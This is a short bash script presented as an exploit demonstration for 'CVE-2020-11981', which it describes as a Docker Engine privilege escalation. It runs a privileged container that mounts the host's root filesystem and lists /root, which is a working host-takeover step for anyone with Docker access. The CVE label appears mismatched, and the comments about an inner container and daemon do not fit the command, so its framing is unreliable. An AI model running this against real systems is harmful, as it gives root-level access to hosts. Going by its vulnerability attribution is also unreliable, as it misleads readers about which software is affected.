#!/bin/bash
# Simple demonstration script for CVE-2020-11981 (Docker Engine privilege escalation)
# This script attempts to create a privileged container that mounts the host filesystem.
# NOTE: This is for testing purposes only in a controlled environment.

echo "[*] Starting exploit demonstration for CVE-2020-11981..."

# Run the inner container using the Docker image that includes the Docker CLI.
# The container is started in privileged mode to allow host filesystem access.
# It uses the Docker daemon running inside the vulnerable-docker container.

docker run --privileged --rm \
  -v /:/hostfs \
  docker:19.03.12 sh -c "echo 'Root on host:' && id -u && ls /hostfs/root" \
  || echo "[!] Exploit failed or Docker not vulnerable"

echo "[*] Exploit script finished."